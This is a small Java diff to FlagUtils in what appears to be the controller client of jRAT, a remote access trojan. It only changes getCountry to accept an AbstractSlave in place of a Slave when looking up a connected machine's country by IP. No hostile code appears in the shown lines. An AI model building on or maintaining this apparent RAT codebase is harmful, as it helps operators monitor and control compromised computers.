@@ -7,6 +7,7 @@ import java.util.Random;
 
 import javax.swing.ImageIcon;
 
+import su.jrat.client.AbstractSlave;
 import su.jrat.client.Main;
 import su.jrat.client.Slave;
 import su.jrat.client.ip2c.Country;
@@ -27,8 +28,8 @@ public class FlagUtils {
 		}
 	}
 
-	public static Country getCountry(Slave s) {
-		return getCountry(s.getRawIP());
+	public static Country getCountry(AbstractSlave abstractSlave) {
+		return getCountry(abstractSlave.getRawIP());
 	}
 
 	public static Country getCountry(String ip) {
